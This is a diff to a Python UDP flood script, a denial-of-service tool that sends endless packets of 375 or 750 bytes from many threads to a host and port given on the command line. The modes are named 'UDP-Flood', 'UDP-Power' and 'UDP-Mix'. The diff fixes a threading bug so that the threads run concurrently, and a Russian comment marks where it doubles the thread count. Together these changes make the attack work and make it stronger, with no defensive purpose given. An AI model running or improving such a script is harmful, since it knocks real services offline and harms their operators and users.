@@ -1,41 +1,37 @@
 import sys
 import socket
 import threading
-#import time as clock
 
 host = str(sys.argv[1])
 port = int(sys.argv[2])
-#time = int(sys.argv[4])
 method = str(sys.argv[3])
 loopss = int(sys.argv[4])
 
-loops = loopss
+loops = loopss * 2  # Увеличиваем количество потоков в два раза
 
 def send_packet(amplifier):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect((str(host), int(port)))
-        while True: s.send(b"\x99" * amplifier)
-    except: return s.close()
-
-#def timer(timeout):
-#    while True:
-#        if clock.time() > timeout: exit()
-#        if clock.time() < timeout: clock.sleep(0.1)
+        while True:
+            s.send(b"\x99" * amplifier)
+    except:
+        return s.close()
 
 def attack_HQ():
-    #timeout = clock.time() + time
-    #timer(timeout)
     if method == "UDP-Flood":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(375), daemon=True).start()
-    if method == "UDP-Power":
+            threading.Thread(target=send_packet, args=(375,), daemon=True).start()
+            print(f"Active threads: {threading.active_count()}")
+    elif method == "UDP-Power":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(750), daemon=True).start()
-    if method == "UDP-Mix":
+            threading.Thread(target=send_packet, args=(750,), daemon=True).start()
+            print(f"Active threads: {threading.active_count()}")
+    elif method == "UDP-Mix":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(375), daemon=True).start()
-            threading.Thread(target=send_packet(750), daemon=True).start()
+            threading.Thread(target=send_packet, args=(375,), daemon=True).start()
+            threading.Thread(target=send_packet, args=(750,), daemon=True).start()
+            print(f"Active threads: {threading.active_count()}")
 
 attack_HQ()
